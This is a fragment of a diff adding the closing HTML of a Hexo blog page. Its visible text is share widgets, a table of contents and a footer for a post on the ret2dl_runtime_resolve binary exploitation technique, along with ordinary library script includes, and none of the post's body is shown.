+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/&title=《Introduction to pwn1.4--ret2dl_runtime_resolve》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/03/14/kanxuectf-2019/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">kanxueCTF-2019</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#相关结构"><span class="post-toc-number">1.</span> <span class="post-toc-text">相关结构</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#example"><span class="post-toc-number">2.</span> <span class="post-toc-text">example</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#正常攻击"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">正常攻击</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#roputils"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">roputils</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我喝奶茶呀
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+</div>
+
+        <footer class="footer">
+    
+    <div class="top">
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Sirius Whiter &copy; 2018 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/&title=《Introduction to pwn1.4--ret2dl_runtime_resolve》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/&title=《Introduction to pwn1.4--ret2dl_runtime_resolve》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsElEQVR42u3aQY5iMQwFwL7/pZntSAh4z06YHqmyakHrf1cWibH98xOvx1/r+ZPnz39G69Xz90/Gw8PDO8t7vF3Jy56/TTYo2bh8c1/GgIeHh3eNlxzTr/7/fdDv8S0jjxkPDw/vt/GSbzf/k1weeHh4eP8Lrz3coyDKCwkPDw/vN/CSYsSsUpqk10nKfr3WgoeHhxfzZq2pf/v3lf4eHh4e3rqrnjTDkiO+HQjIi8IfosXDw8O7wMsP3P2I1Sxlb9+Fh4eH9x1eC5iNFGxGB9qSMR4eHt493mw44CyyHc8qSrd4eHh413j542YJd75Zmze+/K2Ah4eHd5Q3Y+QncF7Sff+E6DdBu/d4eHh4a14b9KlroN3uevQKDw8P7xovbzW14babUhz6yVWBh4eH93XerHnffjJLsofFXDw8PLwFLx+EOpv+7ptq0Vvw8PDwrvH2Qc8KrO/T6/xsj4au8PDw8K7x9g2nWSizsu+HqPDw8PAu8GaJb5sE78sZbdsMDw8P7x4vP3DbZn9+AWyaXh+QeHh4eNd47bG+YWyKHUmhGQ8PD+82b1akaBPu5MX5k9vP8fDw8M7ykoP11EDAphA82yA8PDy827z2JkmaW/nQwKmS8RCAh4eHN+k6Fa39/Mf/LI3OB63yAQU8PDy8s7wkmZ6FMgu6Tc0/XEt4eHh413j7Eag2oHyj2+IFHh4e3nd4SfqblAbyDtQmHS8iwcPDwzvKe5Rrc53k25GXIT68HQ8PD+8CL18zZFvSnf19YOHh4eGVvLzMerYEvCn1FhcPHh4e3jVeXcMIDu7ZNu0vsKIOjYeHh/d13qm0e38N1KMDeHh4eF/ktYNWSXl3M9L6YRPx8PDwrvHacdIkiLxVtmm51UNXeHh4eGte+yM/KdHOhlnzka/DCw8PDy9dfwA+lffdm0QxFgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    
+</body>
+</html>
